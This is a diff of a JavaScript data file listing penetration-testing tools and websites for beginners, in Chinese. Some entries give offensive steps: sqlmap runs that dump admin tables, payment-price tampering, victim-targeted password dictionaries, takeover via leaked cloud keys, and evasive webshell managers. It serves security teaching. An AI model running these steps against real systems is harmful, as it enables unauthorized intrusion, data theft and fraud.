@@ -711,7 +711,8 @@ window.WEBSEC_DATA = {
                         "purpose": "【小白白话通俗理解】就像全网寻人雷达。输入一个目标主域名（如 baidu.com），它能利用全球被动公开数据源，瞬间搜出几千个关联的子域名（如 mail.baidu.com、oa.baidu.com）。",
                         "guide": "免安装二进制程序。下载对应系统架构的 zip 包（如 subfinder_windows_amd64.zip），解压后在命令行运行 `subfinder -d target.com` 即可。",
                         "downloadUrl": "https://github.com/projectdiscovery/subfinder/releases",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
             },
             {
                         "name": "Layer 子域名挖掘机",
@@ -719,15 +720,107 @@ window.WEBSEC_DATA = {
                         "purpose": "【小白白话通俗理解】经典的 Windows 纯图形化子域名枚举工具。内置超大海量字典，只要输入域名点'启动'，就能直观看到所有解析成功的子域名与 IP。",
                         "guide": "Windows 纯绿色版。解压后直接双击运行 `Layer.exe`（需安装 .NET Framework 4.5+ 环境），无需配置复杂环境。",
                         "downloadUrl": "https://github.com/yu2439/Layer",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
             },
             {
-                        "name": "crt.sh (证书透明度日志在线检索)",
+                        "name": "crt.sh (证书透明度日志在线检索平台)",
                         "category": "在线平台 / 免费免安装",
                         "purpose": "【小白白话通俗理解】全球 SSL 数字证书公共查询库。只要企业申请过 HTTPS 证书，都会在这里留下记录，用来挖掘极度隐蔽的历史子域名堪称一绝。",
                         "guide": "无需下载安装，直接在浏览器中打开网址，输入 `%.target.com` 即可搜索全部历史证书记录。",
                         "downloadUrl": "https://crt.sh/",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": true
+            },
+            {
+                        "name": "站长之家多地 Ping (CDN 识别与测速)",
+                        "category": "在线平台 / CDN 穿透",
+                        "purpose": "【小白白话通俗理解】同时调度国内几十个省份的节点去 Ping 目标网站。如果每个地方返回的 IP 不一样，说明目标套了 CDN 缓存加速；如果返回同一个 IP，说明这是源站真实 IP！",
+                        "guide": "打开网页输入目标域名即可一键进行全球多节点 Ping 测速与 IP 解析。",
+                        "downloadUrl": "http://ping.chinaz.com/",
+                        "isOfficial": true,
+                        "isWebsite": true
+            },
+            {
+                        "name": "爱站网多地 Ping 测速平台",
+                        "category": "在线平台 / CDN 穿透",
+                        "purpose": "【小白白话通俗理解】老牌 SEO 与网络资产测绘网站，支持全国各省电信、联通、移动多线路同时发起 Ping 探测。",
+                        "guide": "在搜索框输入目标域名，点击【Ping 检测】查看各地解析出的 IP 列表。",
+                        "downloadUrl": "https://ping.aizhan.com/",
+                        "isOfficial": true,
+                        "isWebsite": true
+            },
+            {
+                        "name": "卡卡网全国多地 Ping 节点测速",
+                        "category": "在线平台 / CDN 穿透",
+                        "purpose": "【小白白话通俗理解】涵盖国内外 50+ 个监测节点的高速 Ping 测试工具，重点排查海外节点是否直接回源暴露真实源站 IP。",
+                        "guide": "在浏览器中直接打开即可使用，支持实时表格导出。",
+                        "downloadUrl": "http://www.webkaka.com/Ping.aspx",
+                        "isOfficial": true,
+                        "isWebsite": true
+            },
+            {
+                        "name": "IP138 IP 与域名信息综合查询网",
+                        "category": "在线平台 / 域名信息收集",
+                        "purpose": "【小白白话通俗理解】国内老牌 IP 归属地与域名绑定历史查询工具，支持查看域名绑定的历史所有 IP 变动轨迹。",
+                        "guide": "输入目标域名或 IP 地址，即可查看机房位置与运营商归属。",
+                        "downloadUrl": "https://site.ip138.com/",
+                        "isOfficial": true,
+                        "isWebsite": true
+            },
+            {
+                        "name": "ViewDNS 历史 DNS 解析记录追溯",
+                        "category": "在线平台 / DNS 历史库",
+                        "purpose": "【小白白话通俗理解】记录了全球域名在没有购买 CDN 之前的最古老 A 记录，经常能顺藤摸瓜直接找到企业最初搭建时的真实源站机房 IP！",
+                        "guide": "在 IP History 工具中输入目标域名即可查询过去 5~10 年的历史解析记录。",
+                        "downloadUrl": "https://viewdns.info/",
+                        "isOfficial": true,
+                        "isWebsite": true
+            },
+            {
+                        "name": "补天漏洞响应平台 (第三方 SRC 平台)",
+                        "category": "在线平台 / 白帽众测",
+                        "purpose": "【小白白话通俗理解】国内领先的第三方漏洞报告平台。白帽子可以在这里合法提交企业通用漏洞与事件型漏洞，获取丰厚现金与荣誉奖励。",
+                        "guide": "实名注册白帽子账号后，按照平台规则提交合规的漏洞测试报告。",
+                        "downloadUrl": "https://www.bountyteam.com/",
+                        "isOfficial": true,
+                        "isWebsite": true
+            },
+            {
+                        "name": "漏洞盒子 VulBox (众测 SRC 平台)",
+                        "category": "在线平台 / 互联网安全众测",
+                        "purpose": "【小白白话通俗理解】汇聚海量政企众测项目的互联网安全测试平台，支持企业专属 SRC 提交与众测项目认领。",
+                        "guide": "注册账号后进入【项目大厅】即可查看当前正在进行众测的目标资产范围。",
+                        "downloadUrl": "https://www.vulbox.com/",
+                        "isOfficial": true,
+                        "isWebsite": true
+            },
+            {
+                        "name": "腾讯安全应急响应中心 (TSRC)",
+                        "category": "企业专属 SRC / 官方网站",
+                        "purpose": "【小白白话通俗理解】腾讯官方漏洞收集与奖励平台，致力于保障微信、QQ、腾讯云等全线业务安全。",
+                        "guide": "提交腾讯业务漏洞，严重漏洞最高可达数万元现金与荣誉勋章奖励。",
+                        "downloadUrl": "https://security.tencent.com/",
+                        "isOfficial": true,
+                        "isWebsite": true
+            },
+            {
+                        "name": "阿里安全响应中心 (ASRC)",
+                        "category": "企业专属 SRC / 官方网站",
+                        "purpose": "【小白白话通俗理解】阿里巴巴集团官方漏洞接收平台，覆盖淘宝、天猫、阿里云、高德等核心生态。",
+                        "guide": "遵循《白帽子行为规范》在授权范围内进行测试并提交报告。",
+                        "downloadUrl": "https://security.alibaba.com/",
+                        "isOfficial": true,
+                        "isWebsite": true
+            },
+            {
+                        "name": "百度安全应急响应中心 (BSRC)",
+                        "category": "企业专属 SRC / 官方网站",
+                        "purpose": "【小白白话通俗理解】百度官方安全响应中心，负责收集和处理百度产品及业务的安全漏洞与威胁情报。",
+                        "guide": "官方公布评分标准与奖励细则，支持按季度发放专属礼品与奖金。",
+                        "downloadUrl": "https://bsrc.baidu.com/",
+                        "isOfficial": true,
+                        "isWebsite": true
             }
 ],
 
@@ -791,7 +884,8 @@ window.WEBSEC_DATA = {
                         "purpose": "【小白白话通俗理解】就像'全楼挨家挨户敲门机器人'。能探测目标服务器开放了哪些端口（如 80 网站、22 远程登录、3306 数据库），并精确识别出服务版本和操作系统型号。",
                         "guide": "Windows 用户下载 `nmap-setup.exe` 一键点击安装，内置 Zenmap 图形化界面与 Npcap 抓包驱动；安装后在命令行直接输入 `nmap target_ip`。",
                         "downloadUrl": "https://nmap.org/download.html",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
             },
             {
                         "name": "Masscan (全网异步超高速端口扫描器)",
@@ -799,7 +893,44 @@ window.WEBSEC_DATA = {
                         "purpose": "【小白白话通俗理解】端口扫描界的'火箭炮'。采用异步传输机制，数分钟内即可完成对全网几十万台主机 65535 个端口的极速普查探活。",
                         "guide": "提供 Windows 编译版本。解压后在 CMD 中运行 `masscan -p1-65535 192.168.1.0/24 --rate=10000`。",
                         "downloadUrl": "https://github.com/robertdavidgraham/masscan/releases",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
+            },
+            {
+                        "name": "FOFA 网络空间测绘平台",
+                        "category": "在线平台 / 网络空间测绘",
+                        "purpose": "【小白白话通俗理解】黑客界的'百度搜索引擎'。百度搜网页文字，FOFA 搜全世界联网的服务器 IP、开放端口、摄像头、路由器和未授权数据库。",
+                        "guide": "无需下载安装，在浏览器中注册账号即可使用，搜索语法如 `ip=\"192.168.1.1/24\"` 或 `port=\"6379\"`。",
+                        "downloadUrl": "https://fofa.info/",
+                        "isOfficial": true,
+                        "isWebsite": true
+            },
+            {
+                        "name": "Hunter 鹰图网络空间测绘引擎",
+                        "category": "在线平台 / 奇安信空间测绘",
+                        "purpose": "【小白白话通俗理解】奇安信出品的中文资产检索平台，拥有庞大的国内企业资产指纹库，支持一键查询 C 段资产与企业所属 IP 资产群。",
+                        "guide": "浏览器打开即可搜索，支持根据企业名称 (`company=\"目标企业\"`) 直接查询其名下全部外网 IP 资产。",
+                        "downloadUrl": "https://hunter.qianxin.com/",
+                        "isOfficial": true,
+                        "isWebsite": true
+            },
+            {
+                        "name": "ZoomEye 钟馗之眼网络空间搜索引擎",
+                        "category": "在线平台 / 知道创宇空间测绘",
+                        "purpose": "【小白白话通俗理解】知道创宇旗下网络空间雷达，支持按组件版本、地理位置、高危服务端口等维度进行全网大数据检索。",
+                        "guide": "在搜索框输入 `app:\"MySQL\" +port:3306` 即可查看全网开放的 MySQL 实例。",
+                        "downloadUrl": "https://www.zoomeye.org/",
+                        "isOfficial": true,
+                        "isWebsite": true
+            },
+            {
+                        "name": "Shodan 全球联网设备搜索引擎",
+                        "category": "在线平台 / 国际权威测绘",
+                        "purpose": "【小白白话通俗理解】全球最早、最知名的网络空间扫描平台，专注于搜索工业控制系统、视频监控和未设密码的物联网设备。",
+                        "guide": "在搜索栏输入 `product:\"Redis\"` 即可查看全球开放的 Redis 缓存服务器。",
+                        "downloadUrl": "https://www.shodan.io/",
+                        "isOfficial": true,
+                        "isWebsite": true
             }
 ],
 
@@ -861,15 +992,44 @@ window.WEBSEC_DATA = {
                         "purpose": "【小白白话通俗理解】Web 安全渗透必装的'显微镜与拦截网'。浏览器发送给网站的所有网络请求，都会先经过它，你可以随意查看、暂停、修改请求内容再发给网站。",
                         "guide": "跨平台官方安装包。运行需要 Java JDK 17+ 环境。双击安装后，在浏览器设置 HTTP 代理为 `127.0.0.1:8080` 并导入 Burp 根证书即可抓包。",
                         "downloadUrl": "https://portswigger.net/burp/communitydownload",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
             },
             {
-                        "name": "FOFA 网络空间测绘平台",
-                        "category": "在线测绘 / 资产检索",
-                        "purpose": "【小白白话通俗理解】黑客界的'百度搜索引擎'。百度搜网页内容，FOFA 搜全世界联网的服务器、摄像头、路由器、OA系统和漏洞指纹。",
-                        "guide": "无需下载安装，在浏览器中注册账号即可使用，搜索语法如 `title=\"后台管理\" && country=\"CN\"`。",
-                        "downloadUrl": "https://fofa.info/",
-                        "isOfficial": true
+                        "name": "PeiQi WiKi-Sec (优质开源漏洞文库)",
+                        "category": "在线平台 / 漏洞复现手册",
+                        "purpose": "【小白白话通俗理解】国内安全圈极受欢迎的面向实战的 Nday 漏洞知识库。整理了上千个主流 OA、CMS、框架的漏洞成因、抓包复现数据包与一键利用 PoC。",
+                        "guide": "浏览器打开直接在线查阅，支持按产品品牌分类快速搜索。",
+                        "downloadUrl": "http://wiki.peiqi.tech/",
+                        "isOfficial": true,
+                        "isWebsite": true
+            },
+            {
+                        "name": "Exploit-DB (全球权威开源漏洞利用库)",
+                        "category": "在线平台 / 官方漏洞库",
+                        "purpose": "【小白白话通俗理解】由 Offensive Security 维护的全球最大公开漏洞利用代码库，收录了上万个已公开确认的高危漏洞完整 Exp 脚本与漏洞分析报告。",
+                        "guide": "直接输入 CVE 编号或软件名称即可免费下载经过安全审计的复现脚本。",
+                        "downloadUrl": "https://www.exploit-db.com/",
+                        "isOfficial": true,
+                        "isWebsite": true
+            },
+            {
+                        "name": "CVE 官方漏洞字典库 (MITRE)",
+                        "category": "官方网站 / 国际标准",
+                        "purpose": "【小白白话通俗理解】全球所有网络安全漏洞的'官方身份证登记处'。每个被发现的漏洞都会被分配一个独一无二的编号（如 CVE-2021-44228）。",
+                        "guide": "输入 CVE 编号即可查看官方权威评级与受影响版本清单。",
+                        "downloadUrl": "https://cve.mitre.org/",
+                        "isOfficial": true,
+                        "isWebsite": true
+            },
+            {
+                        "name": "Pocsuite3 (开源漏洞 PoC 框架与文库)",
+                        "category": "漏洞框架 / 404实验室",
+                        "purpose": "【小白白话通俗理解】知道创宇开源的远程漏洞验证框架，支持一键批量加载几百个 PoC 脚本对目标系统进行合规检测。",
+                        "guide": "执行 `pip install pocsuite3` 即可一键安装使用。",
+                        "downloadUrl": "https://pocsuite.org/",
+                        "isOfficial": true,
+                        "isWebsite": false
             }
 ],
 
@@ -929,7 +1089,8 @@ Client (生成 Timestamp + Nonce)
                         "purpose": "【小白白话通俗理解】全自动'试钥匙机器人'。截获登录请求后，将用户名和密码设为变量，载入数万条字典，以每秒上百次的速度全自动枚举碰撞正确密码。",
                         "guide": "内置于 Burp Suite 主界面。抓包后右键 `Send to Intruder (Ctrl+I)`，设置 Positions 变量与 Payloads 字典即可一键 Start Attack。",
                         "downloadUrl": "https://portswigger.net/burp/communitydownload",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
             },
             {
                         "name": "CUPP (Common User Passwords Profiler)",
@@ -937,7 +1098,26 @@ Client (生成 Timestamp + Nonce)
                         "purpose": "【小白白话通俗理解】根据目标受害者的名字拼音、生日、手机号、公司名、宠物名等个人信息，智能组合生成超高命中率的定向弱口令字典。",
                         "guide": "Python 源码脚本。本地安装 Python 3 环境后，在命令行执行 `python cupp.py -i` 按照交互式问答即可自动生成字典文件。",
                         "downloadUrl": "https://github.com/Mebus/cupp",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
+            },
+            {
+                        "name": "SOMD5 在线 Hash 密码解密平台",
+                        "category": "在线平台 / 密文解密",
+                        "purpose": "【小白白话通俗理解】海量 MD5/SHA1/NTLM 密文反向查询数据库。输入一段看不懂的 32 位 MD5 密文，一秒钟查出原始明文密码（如 123456）。",
+                        "guide": "直接在浏览器输入密文点击【解密】即可查看查询结果。",
+                        "downloadUrl": "https://www.somd5.com/",
+                        "isOfficial": true,
+                        "isWebsite": true
+            },
+            {
+                        "name": "CMD5 在线密码查询平台",
+                        "category": "在线平台 / 密码破解",
+                        "purpose": "【小白白话通俗理解】国内数据量最大的在线 Hash 查询解密平台之一，支持多种加盐算法的反查碰撞。",
+                        "guide": "打开网页粘贴密文即可实时检索庞大的彩虹表数据库。",
+                        "downloadUrl": "https://www.cmd5.com/",
+                        "isOfficial": true,
+                        "isWebsite": true
             }
 ],
 
@@ -988,7 +1168,17 @@ Client (生成 Timestamp + Nonce)
                         "purpose": "【小白白话通俗理解】单步调试与参数篡改神器。你可以随时修改数据包里的用户 ID（如将 `user_id=1001` 改为 `1002`），反复点击 Send 观察后端返回是否越权。",
                         "guide": "内置于 Burp Suite。在 HTTP History 中右键请求选择 `Send to Repeater (Ctrl+R)` 即可实时编辑与重放。",
                         "downloadUrl": "https://portswigger.net/burp/communitydownload",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
+            },
+            {
+                        "name": "在线 MD5 加解密平台 (CMD5)",
+                        "category": "在线平台 / Token 逆向分析",
+                        "purpose": "【小白白话通俗理解】用来快速判断找回密码链接中的重置 Token 是否仅由 `md5(username + 时间戳)` 简单哈希生成。",
+                        "guide": "直接在浏览器打开查询 Token 对应的明文字符串规律。",
+                        "downloadUrl": "https://www.cmd5.com/",
+                        "isOfficial": true,
+                        "isWebsite": true
             }
 ],
 
@@ -1040,12 +1230,22 @@ if (!$order) {
           localFiles: ["22-支付逻辑与任意用户注册漏洞.pdf"],
           tools: [
             {
+                        "name": "Burp Suite Repeater (支付参数篡改)",
+                        "category": "接口调试 / 篡改单价与数量",
+                        "purpose": "【小白白话通俗理解】在结算请求发往服务器前，手动将商品价格从 `19999` 修改为 `0.01`，或者将附加服务数量修改为 `-205` 测试负数套现逻辑。",
+                        "guide": "在 Burp 中抓取订单结算包，发送至 Repeater 模块进行参数编辑和发送。",
+                        "downloadUrl": "https://portswigger.net/burp/communitydownload",
+                        "isOfficial": true,
+                        "isWebsite": false
+            },
+            {
                         "name": "Turbo Intruder (超高并发竞争插件)",
                         "category": "Burp 插件 / 条件竞争利用",
                         "purpose": "【小白白话通俗理解】用 C 语言底层编写的极速发包引擎。能在 1 毫秒内瞬间并发发送几百个兑换红包/抽奖请求，在数据库扣款前抢先多次兑现。",
                         "guide": "在 Burp Suite 顶部的 `Extensions` ➔ `BApp Store` 中搜索 `Turbo Intruder` 点击 `Install` 即可直接安装使用。",
                         "downloadUrl": "https://github.com/PortSwigger/turbo-intruder",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
             }
 ],
 
@@ -1091,7 +1291,8 @@ if (!$order) {
                         "purpose": "【小白白话通俗理解】阿里云官方命令行管理工具。输入泄露的 AccessKeyId 与 SecretAccessKey 后，可一键接管云服务器、RDS 数据库与云存储桶。",
                         "guide": "解压后在命令行执行 `aliyun configure` 填入 AK/SK 凭证，即可调用各类 API 管理云资产。",
                         "downloadUrl": "https://github.com/aliyun/aliyun-cli/releases",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
             },
             {
                         "name": "AWS CLI (亚马逊云命令行工具)",
@@ -1099,7 +1300,26 @@ if (!$order) {
                         "purpose": "【小白白话通俗理解】AWS 官方终端工具。通过配置云凭证可直接调用 S3 存储桶、EC2 云主机与 IAM 权限策略。",
                         "guide": "Windows 下载 MSI 安装包直接下一步安装，在命令行执行 `aws configure` 初始化配置。",
                         "downloadUrl": "https://aws.amazon.com/cli/",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
+            },
+            {
+                        "name": "阿里云官方管理控制台",
+                        "category": "官方网站 / 云管理平台",
+                        "purpose": "【小白白话通俗理解】阿里云全部云上资源（ECS、RDS、OSS、RAM）的图形化综合管理入口。",
+                        "guide": "在浏览器中访问并登录即可直观管理云上资产与访问控制策略 (RAM)。",
+                        "downloadUrl": "https://home.console.aliyun.com/",
+                        "isOfficial": true,
+                        "isWebsite": true
+            },
+            {
+                        "name": "AWS 亚马逊云管理控制台",
+                        "category": "官方网站 / 云管理平台",
+                        "purpose": "【小白白话通俗理解】全球最大公有云平台 AWS 的一站式可视化控制台，支持管理 IAM 角色与全球数据中心资源。",
+                        "guide": "在浏览器打开登录即可配置安全组防火墙与审计日志 (CloudTrail)。",
+                        "downloadUrl": "https://console.aws.amazon.com/",
+                        "isOfficial": true,
+                        "isWebsite": true
             }
 ],
 
@@ -1155,7 +1375,8 @@ if (!$order) {
                         "purpose": "【小白白话通俗理解】像百度网盘一样的存储桶可视化浏览器。只要有存储桶名称或 AccessKey，就能图形化直观浏览、批量上传下载云上文件。",
                         "guide": "绿色免安装。下载 Windows 64位 zip 包解压，双击 `oss-browser.exe` 即可直接运行。",
                         "downloadUrl": "https://github.com/aliyun/oss-browser/releases",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
             },
             {
                         "name": "S3Scanner (S3 存储桶未授权快速扫描)",
@@ -1163,7 +1384,26 @@ if (!$order) {
                         "purpose": "【小白白话通俗理解】批量检测全世界的 AWS S3 存储桶是否存在'公共可读(Public Read)'与'公共可写(Public Write)'高危配置缺陷。",
                         "guide": "使用 pip 一键安装：`pip install s3scanner`，在命令行中执行 `s3scanner scan --bucket my-target-bucket`。",
                         "downloadUrl": "https://github.com/sa7mon/S3Scanner",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
+            },
+            {
+                        "name": "阿里云 OSS 对象存储控制台",
+                        "category": "官方网站 / 存储桶管理",
+                        "purpose": "【小白白话通俗理解】阿里云官方 OSS 存储桶创建、权限策略 (ACL) 设置与防盗链配置中心。",
+                        "guide": "登录控制台可直接修改存储桶读写权限（私有/公共读/公共读写）。",
+                        "downloadUrl": "https://oss.console.aliyun.com/",
+                        "isOfficial": true,
+                        "isWebsite": true
+            },
+            {
+                        "name": "AWS S3 对象存储控制台",
+                        "category": "官方网站 / 存储桶管理",
+                        "purpose": "【小白白话通俗理解】AWS 官方 S3 存储桶管理平台，提供 Block Public Access（阻止公共访问）全局安全开关。",
+                        "guide": "在控制台中可查看存储桶策略与版本控制 (Versioning)。",
+                        "downloadUrl": "https://s3.console.aws.amazon.com/",
+                        "isOfficial": true,
+                        "isWebsite": true
             }
 ],
 
@@ -1210,7 +1450,8 @@ if (!$order) {
                         "purpose": "【小白白话通俗理解】整合了外网资产测绘、CDN 穿透识别、端口指纹扫描与逻辑漏洞验证的必备工具箱组合。",
                         "guide": "确保已安装 Burp Suite 抓包代理与 Nmap 端口扫描器，结合命令行进行端到端全链路渗透。",
                         "downloadUrl": "https://portswigger.net/burp/communitydownload",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
             }
 ],
 
@@ -1265,7 +1506,8 @@ if (!$order) {
                         "purpose": "【小白白话通俗理解】嵌在浏览器 F12 里的'渗透小键盘'。一键生成单引号闭合、Union Select 语句、自动进行 URL 编码与 Base64 解码，免去手动输入的繁琐。",
                         "guide": "支持 Firefox 与 Chrome 浏览器。在浏览器扩展商店或 GitHub 下载 crx/xpi 插件安装，按 F12 打开控制台即可看到 HackBar 选项卡。",
                         "downloadUrl": "https://github.com/0x000000a/hackbar",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
             },
             {
                         "name": "phpStudy 小皮面板 (本地靶场环境搭建)",
@@ -1273,7 +1515,26 @@ if (!$order) {
                         "purpose": "【小白白话通俗理解】新手在自己电脑上一键搭建 Apache、Nginx、PHP、MySQL 网站服务器的经典神器，用来练习 SQL 注入和文件上传绝佳搭配。",
                         "guide": "访问小皮官网下载 Windows 安装包，解压后双击安装，点击'启动'即可在本地运行完整的 Web 与 MySQL 数据库服务。",
                         "downloadUrl": "https://www.xp.cn/download.html",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
+            },
+            {
+                        "name": "MySQL 8.0 官方参考手册 (官方文档)",
+                        "category": "官方网站 / 数据库规范",
+                        "purpose": "【小白白话通俗理解】MySQL 最权威的官方说明书，包含 information_schema 结构、函数用法与注入底层原理。",
+                        "guide": "在线查阅各版本 MySQL 内置函数与系统元数据表定义。",
+                        "downloadUrl": "https://dev.mysql.com/doc/refman/8.0/en/",
+                        "isOfficial": true,
+                        "isWebsite": true
+            },
+            {
+                        "name": "SQLZoo 在线交互式 SQL 练习平台",
+                        "category": "在线平台 / 零基础入门",
+                        "purpose": "【小白白话通俗理解】免费易学的 SQL 语法在线学习平台，支持在网页里直接敲 SQL 语句查数据库，快速建立 SELECT / WHERE / GROUP BY 概念！",
+                        "guide": "无需注册打开即练，包含丰富的真实数据集与通俗题目。",
+                        "downloadUrl": "https://sqlzoo.net/",
+                        "isOfficial": true,
+                        "isWebsite": true
             }
 ],
 
@@ -1330,7 +1591,17 @@ $row = $stmt->fetch(PDO::FETCH_ASSOC);
                         "purpose": "【小白白话通俗理解】世界上最流行、最易学的黑客编程语言。几十行 Python requests 脚本就能自动发送成千上万个盲注测试包，秒级跑出数据库名字。",
                         "guide": "下载 Windows 64-bit installer，安装时务必勾选【Add Python to PATH】（添加到环境变量），打开 CMD 输入 `python --version` 验证。",
                         "downloadUrl": "https://www.python.org/downloads/",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
+            },
+            {
+                        "name": "ASCII 码对照表在线查询网",
+                        "category": "在线平台 / 编码速查",
+                        "purpose": "【小白白话通俗理解】快速速查每一个字符对应的 ASCII 整数值（如 'A' 是 65，'a' 是 97，'0' 是 48），盲注二分法区间设置必备参考。",
+                        "guide": "打开网页即可查看完整的十进制、十六进制与字符对应表。",
+                        "downloadUrl": "https://www.asciitable.com/",
+                        "isOfficial": true,
+                        "isWebsite": true
             }
 ],
 
@@ -1400,7 +1671,17 @@ print(f"Database Name: {db_name}")
                         "purpose": "【小白白话通俗理解】用来查看和管理 MySQL/Oracle/MSSQL 数据库的图形化工具，直观查看数据表结构与字符集设置（如 GBK / UTF-8）。",
                         "guide": "DBeaver 为全球最流行的免费开源多数据库管理工具，下载 Community 版安装包即可使用。",
                         "downloadUrl": "https://dbeaver.io/download/",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
+            },
+            {
+                        "name": "MySQL XML 报错函数官方手册 (UpdateXML)",
+                        "category": "官方网站 / 语法参考",
+                        "purpose": "【小白白话通俗理解】官方对 UpdateXML 与 ExtractValue 函数语法的详细定义，帮助理解为什么构造非法的 XPath 会触发数据库报错并将查询结果外带回显。",
+                        "guide": "在线查看 XML 函数参数要求与报错机制。",
+                        "downloadUrl": "https://dev.mysql.com/doc/refman/8.0/en/xml-functions.html",
+                        "isOfficial": true,
+                        "isWebsite": true
             }
 ],
 
@@ -1455,15 +1736,35 @@ print(f"Database Name: {db_name}")
                         "purpose": "【小白白话通俗理解】SQL 注入界的'全自动轰炸机'。只要给它一个存在注入的网址，它能自动识别数据库类型、自动绕过 WAF、自动把整个数据库里的表和密码全部 Dump 导出！",
                         "guide": "免安装 Python 脚本工具。下载解压后，在目录内打开 CMD 执行 `python sqlmap.py -u \"http://target.com/view.php?id=1\" --dbs` 即可运行。",
                         "downloadUrl": "https://github.com/sqlmapproject/sqlmap/releases",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
             },
             {
                         "name": "DNSLog.cn 在线带外回显平台",
-                        "category": "在线辅助 / 无回显漏洞利用",
-                        "purpose": "【小白白话通俗理解】'暗号接收信箱'。当目标服务器没有任何报错和回显时，让数据库向该平台发送一个 DNS 查询，查询结果直接在网页刷新查看！",
+                        "category": "在线平台 / 无回显漏洞利用",
+                        "purpose": "【小白白话通俗理解】'暗号接收信箱'。当目标服务器没有任何报错和回显时，让数据库向该平台发送一个 DNS 查信请求，查询结果直接在网页刷新查看！",
                         "guide": "浏览器打开网站，点击【Get SubDomain】获取专属临时二级域名，触发注入后点击【Refresh Record】查看捕获的明文数据。",
                         "downloadUrl": "http://www.dnslog.cn/",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": true
+            },
+            {
+                        "name": "Ceye.io 在线安全监控带外平台",
+                        "category": "在线平台 / OOB 带外平台",
+                        "purpose": "【小白白话通俗理解】专为安全测试设计的 DNS 与 HTTP 请求日志接收平台，支持 API 自动化提取带外回显数据。",
+                        "guide": "注册登录后获取专属 Identifier 域名，可在控制台实时查看带外请求。",
+                        "downloadUrl": "http://ceye.io/",
+                        "isOfficial": true,
+                        "isWebsite": true
+            },
+            {
+                        "name": "Burp Collaborator 官方说明文档",
+                        "category": "官方网站 / 商业带外系统",
+                        "purpose": "【小白白话通俗理解】Burp Suite 官方内置的企业级带外数据接收服务，支持 DNS、HTTP、SMTP 协议全自动带外捕获。",
+                        "guide": "在 Burp 菜单中打开 `Burp` ➔ `Burp Collaborator client` 即可直接使用。",
+                        "downloadUrl": "https://portswigger.net/burp/documentation/desktop/tools/collaborator-client",
+                        "isOfficial": true,
+                        "isWebsite": true
             }
 ],
 
@@ -1521,7 +1822,8 @@ sqlmap -r req.txt -D security_db -T admin_users --dump --batch
                         "purpose": "【小白白话通俗理解】新一代黑客必备的'隐形后门连接器'。客户端与服务器之间每次通信都使用动态协商的 AES-128 加密密钥，所有流量全是乱码，WAF 根本看不懂！",
                         "guide": "跨平台 Java 工具。下载 zip 解压后，双击 `Behinder.jar` 运行（需 Java JDK 11+ 环境）。在服务端上传配套的 shell.php 后，在客户端添加 URL 和密码即可连接。",
                         "downloadUrl": "https://github.com/rebeyond/Behinder/releases",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
             },
             {
                         "name": "中国蚁剑 AntSword (跨平台模块化 Webshell 管理工具)",
@@ -1529,7 +1831,8 @@ sqlmap -r req.txt -D security_db -T admin_users --dump --batch
                         "purpose": "【小白白话通俗理解】中国菜刀的全面升级换代版。支持自定义编解码器、图形化文件管理、虚拟终端命令行与数据库一键管理。",
                         "guide": "下载 AntSword-Loader 加载器与 antSword 源码核心包，解压后双击运行加载器，选择源码目录初始化即可使用。",
                         "downloadUrl": "https://github.com/AntSwordProject/AntSword-Loader/releases",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
             },
             {
                         "name": "哥斯拉 Godzilla (原生字节码免杀后门平台)",
@@ -1537,7 +1840,26 @@ sqlmap -r req.txt -D security_db -T admin_users --dump --batch
                         "purpose": "【小白白话通俗理解】专为攻防演练与红蓝对抗设计的极强免杀管理工具，支持动态内存加载字节码执行，支持无文件落地内存马管理。",
                         "guide": "Java 原生单文件 jar 包。在命令行执行 `java -jar Godzilla.jar` 即可打开控制台。",
                         "downloadUrl": "https://github.com/BeichenDream/Godzilla/releases",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
+            },
+            {
+                        "name": "微步在线云沙箱 (Webshell 深度分析)",
+                        "category": "在线平台 / 恶意样本分析",
+                        "purpose": "【小白白话通俗理解】国内顶尖的在线恶意文件分析沙箱。上传疑似 Webshell 的脚本，沙箱能在一分钟内出具行为分析、网络外联与查杀结论！",
+                        "guide": "浏览器打开网页，直接拖入可疑 PHP/JSP 脚本即可一键启动多引擎动静态分析。",
+                        "downloadUrl": "https://s.threatbook.com/",
+                        "isOfficial": true,
+                        "isWebsite": true
+            },
+            {
+                        "name": "VirusTotal 全球多引擎病毒查杀平台",
+                        "category": "在线平台 / 全球杀毒引擎聚合",
+                        "purpose": "【小白白话通俗理解】Google 旗下全球最大的病毒检测平台，聚合了全球 70+ 款主流杀毒软件引擎（卡巴斯基、赛门铁克、微软等）同步检测文件安全性。",
+                        "guide": "上传文件或输入 URL 即可查看全球各大安全厂商的查杀结果。",
+                        "downloadUrl": "https://www.virustotal.com/",
+                        "isOfficial": true,
+                        "isWebsite": true
             }
 ],
 
@@ -1589,7 +1911,17 @@ Behinder Client
                         "purpose": "【小白白话通俗理解】国内公认最优秀的文件上传通关靶场，由浅入深包含前端 JS、MIME 伪造、黑名单、白名单、.htaccess、00截断等 21 道经典关卡。",
